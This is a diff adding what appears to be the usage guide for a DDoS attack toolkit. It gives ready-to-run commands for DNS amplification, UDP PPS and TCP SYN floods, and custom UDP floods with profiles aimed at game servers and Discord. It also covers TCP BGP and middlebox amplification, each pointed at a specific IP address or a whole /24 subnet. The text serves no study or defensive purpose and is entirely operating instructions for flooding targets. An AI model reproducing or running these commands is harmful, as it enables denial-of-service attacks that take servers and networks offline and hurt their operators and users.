@@ -1,0 +1,56 @@
+---> [NORMAL UDP AMPLIFICATIONS]
+
+Example to attack single IP address
+
+./dns_amp 98.197.28.92/32 0 dnsf.txt 1 -1 30
+
+Example to attack full subnet
+
+./dns_amp 98.197.28.92/24 0 dnsf.txt 1 -1 30
+
+
+
+---> [NORMAL UDP/TCP METHODS]
+
+Those methods don't support random ports
+
+./udp_pps 98.197.28.92 7777 1 -1 30
+./tcp_syn 98.197.28.92 7777 1 -1 30
+
+
+
+---> [UDP CUSTOM METHOD]
+
+This method has a more complex usage
+
+Example:
+
+./udp_custom 98.197.28.92 7777 0 0 1 -1 30 source
+
+The last argument is the profile, there is some profiles available:
+
+fivem1 fivem2 gmod csgo ts3 source discord
+
+
+
+---> [TCP BGP AMPLIFICATION]
+
+This methods don't support random ports
+
+The threading on this method is different, 12 should do around 250kpps
+
+Example to attack single IP address
+
+./tcp_bgp 98.197.28.92/32 80 bgp.txt 12 30
+
+Example to attack full subnet
+
+./tcp_bgp 98.197.28.92/24 80 bgp.txt 12 30
+
+
+
+---> [TCP MIDDLEBOX AMPLIFICATION]
+
+This method needs to attack on random ports in order to work
+
+./tcp_mb 98.197.28.92 middlebox.txt 1 -1 120
